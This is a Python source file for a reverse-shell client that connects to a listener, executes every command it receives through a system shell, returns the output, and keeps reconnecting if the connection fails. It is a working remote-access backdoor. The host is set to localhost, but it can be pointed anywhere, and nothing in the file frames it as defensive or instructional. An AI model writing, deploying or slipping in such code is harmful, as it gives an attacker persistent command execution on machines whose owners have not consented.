import os
import socket
import subprocess
import sys
import threading
from time import sleep


class ShellClient:

    def __init__(self):
        self.HOST = '127.0.0.1'
        self.PORT = 8080
        self.sock = self.create_socket()
        self.main()

    # Head function of the shell. Deals the error handling and connection
    def main(self):
        # This try expect clause handes an offline server
        try:
            self.sock.connect((self.HOST, self.PORT))
            sleep(1)
            while True:
                # This try expect clause handles the server going offline. It reinitializes the shell so it starts trying to connect again.
                try:
                    self.sock.send("\nConnected\n".encode('utf-8'))
                    recv_thread = threading.Thread(target=self.recv_message, args=())
                    recv_thread.start()
                    recv_thread.join()
                except (ConnectionResetError) as e:
                    print("in thread control")
                    print(e)
                    self.sock.shutdown(socket.SHUT_RDWR)
                    self.sock.close()
                    self.__init__()
                    continue
        except (ConnectionRefusedError) as e:
            print("in main loop")
            print(e)
            self.main()

    # Function for receiving messages
    def recv_message(self):
        while True:
            try:
                self.sock.send("{}>".format(os.getcwd()).encode())
                message = self.sock.recv(2048)
                if message:
                    message = message.decode()
                    if message == "1":
                        self.sock.send("\nClosing connection".encode('utf-8'))
                        sys.exit()
                    if message[:2] == "cd":
                        os.chdir(message[3:])
                    else:
                        cmd = subprocess.Popen(message, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE)
                        output = ("\n{}#>{} {} {}".format(os.getcwd(), cmd.stdout.read().decode('utf-8'),
                                                          cmd.stdout.read().decode('utf-8'),
                                                          cmd.stderr.read().decode('utf-8')))
                        self.sock.send((output.encode("utf-8")))
            except (IOError, BrokenPipeError, ConnectionRefusedError, ConnectionResetError, ConnectionError) as e:
                print(e)
                print('In recv_thread')
                self.main()
                continue

    # Create method for shell socket
    @staticmethod
    def create_socket():
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shell = ShellClient()
